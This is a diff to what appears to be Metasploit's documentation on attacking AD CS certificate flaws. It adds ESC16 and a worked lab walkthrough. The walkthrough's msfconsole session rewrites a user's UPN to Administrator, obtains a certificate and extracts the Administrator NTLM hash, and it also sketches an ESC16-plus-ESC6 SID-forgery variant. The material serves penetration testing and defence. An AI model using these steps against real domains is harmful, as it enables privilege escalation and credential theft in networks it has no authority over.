@@ -17,6 +17,7 @@ flowchart TD
     subgraph esc_update_ldap_object[<b>esc_update_ldap_object</b>]
         ESC9(ESC9) --> weak_certificate_mapping[<i>Issuance via Weak Certificate Mapping</i>]
         ESC10(ESC10) --> weak_certificate_mapping[<i>Issuance via Weak Certificate Mapping</i>]
+        ESC16(ESC16) --> weak_certificate_mapping[<i>Issuance via Weak Certificate Mapping</i>]
     end
     subgraph icpr_cert[<b>icpr_cert</b>]
         ESC1(ESC1)
@@ -123,9 +124,10 @@ Later, additional techniques were disclosed by security researchers:
   manipulation
   - [EKUwu: Not just another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
   - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc15]]
-
-Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4, ESC8, ESC9, ESC10, ESC13 and ESC15. As such, this page only
-covers exploiting that subset of ESC flaws.
+- ESC16 - Security Extension Disabled on CA (Globally)
+  - [ESC16 - Security Extension Disabled on CA](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)
+Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4, ESC8, ESC9, ESC10, ESC13, ESC15 and ESC16.
+As such, this page only covers exploiting that subset of ESC flaws.
 
 Before continuing, it should be noted that ESC1 is slightly different than ESC2 and ESC3
 as the diagram notes above. This is because in ESC1, one has control over the
@@ -1454,6 +1456,97 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Finally, *this* certificate can be used to authenticate to Kerberos with the `kerberos/get_ticket` module.
+
+# Exploiting ESC16
+ESC16 refers to a CA-level misconfiguration where the SID security extension (OID `1.3.6.1.4.1.311.25.2)`, introduced in
+the May 2022 KB5014754 update, is globally disabled. This extension allows domain controllers to securely map
+certificates to user or computer SIDs for strong authentication.
+
+When this OID is listed under the CA’s `DisableExtensionList` registry key, which is located:
+`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>\`
+all certificates issued by the CA will lack the SID binding, making every template behave as though it has the 
+`CT_FLAG_NO_SECURITY_EXTENSION` flag (essentially ESC9).
+
+## ESC16 Scenario 1
+If domain controllers aren’t in Full Enforcement mode (`StrongCertificateBindingEnforcement` != 2), they fall back to
+weaker mapping methods like UPN or DNS from the certificate’s SAN potentially reintroducing risks similar to the
+Certifried vulnerability (CVE-2022-26923) or ESC9 however for our purposes given the `DisableExtensionList` is called 
+"ESC16 Scenario 1". The way you exploit ESC16 scenario 1 with Metasploit is identical to how you would exploit ESC9:
+
+```
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
+rhosts => 172.16.199.200
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldaprport 389
+ldaprport => 389
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username user2
+target_username => user2
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbdomain kerberos.issue
+smbdomain => kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbpass N0tpassword!
+smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbuser user1
+smbuser => user1
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set alt_upn Administrator@kerberos.issue
+alt_upn => Administrator@kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ca kerberos-dc2-ca
+ca => kerberos-dc2-ca
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set cert_template ESC16-Template
+cert_template => ESC16-Template
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
+[*] Running module against 172.16.199.200
+[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName:
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
+[+] The operation completed successfully!
+[+] 172.16.199.200:445 - The requested certificate was issued.
+[*] 172.16.199.200:445 - Certificate Policies:
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.16.199.200:445 - Certificate UPN: Administrator@kerberos.issue
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250603131001_default_172.16.199.200_windows.ad.cs_555632.pfx
+[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Attempting to delete attribute userPrincipalName from CN=user2,CN=Users,DC=kerberos,DC=issue...
+[+] Successfully deleted attribute userPrincipalName from CN=user2,CN=Users,DC=kerberos,DC=issue
+[+] The operation completed successfully!
+[*] Auxiliary module execution completed
+```
+
+With the certificate issued, the attacker can then use the `kerberos/get_ticket` module to obtain the hash of the admin user:
+```
+msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.16.199.200 cert_file=/Users/jheysel/.msf4/loot/20250603131001_default_172.16.199.200_windows.ad.cs_555632.pfx
+[*] Running module against 172.16.199.200
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250603131016_default_172.16.199.200_mit.kerberos.cca_593591.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for Administrator@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250603131016_default_172.16.199.200_mit.kerberos.cca_214080.bin
+[+] Found NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
+[*] Auxiliary module execution completed
+```
+
+#### ESC16 Scenario 2
+If domain controllers are in Full Enforcement mode (`StrongCertificateBindingEnforcement` == 2), ESC16 alone would normally
+prevent authentication using certificates that lack the required SID extension. However, if the CA is also vulnerable
+to ESC6, which is defined as: `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is set under it's `EditFlags` registry key, located here:
+`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>\` 
+
+then the CA accepts arbitrary SAN values from certificate request attribute and an attacker can still bypass strong
+certificate mapping.
+
+In this case, the attacker requests a certificate from the ESC16-affected CA using any client authentication template
+(like "User"), which ensures the SID security extension is omitted. At the same time, they exploit the ESC6 weakness to
+inject a custom Subject Alternative Name that includes both a forged UPN and a specially crafted SID value using the format:
+`URI:tag:microsoft.com,2022-09-14:sid:<SID>`.
+
+Because the certificate lacks the official SID extension (due to ESC16) but includes a valid-looking SAN SID URI
+(via ESC6), the domain controller accepts it and maps the certificate using the supplied SID—even in Full Enforcement mode.
+
+The way you would exploit ESC16 Scenario 2 with Metasploit is different than Scenario 1 as we don't need to update
+any LDAP objects, and so we can use the `icpr_cert` module to request a certificate. 
 
 # Authenticating With A Certificate
 Metasploit supports authenticating with certificates in a couple of different ways. These techniques can be used to take
